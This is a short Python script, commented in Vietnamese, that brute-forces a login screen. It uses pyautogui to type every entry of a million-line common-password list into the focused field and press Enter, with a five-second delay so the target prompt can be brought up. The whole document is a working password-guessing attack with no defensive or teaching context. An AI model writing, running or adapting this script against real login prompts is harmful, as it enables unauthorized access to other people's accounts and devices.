import os
import pyautogui
import time

# Duong dan tep mat khau
password_file_path = "10-million-password-list-top-1000000.txt"

# Thoi gian cho nguoi dung chuan bị giao dien dang nhap
print("[!] Waiting 5 seconds before starting brute force...")
time.sleep(5)

# Thu mo tep chua mat khau
try:
    pass_file = open(password_file_path, "r")
except:
    print("[X] Password file not found or cannot be opened.")
    quit()

# brute force
print("Starting password brute-force...")

for password in pass_file:
    password = password.strip()

    pyautogui.write(password, interval=0.1)
    pyautogui.press('enter')
    time.sleep(0.5)

    print(f"Tried password: {password}")

# Dong tep khi nhap xong
pass_file.close()

print("Done.")
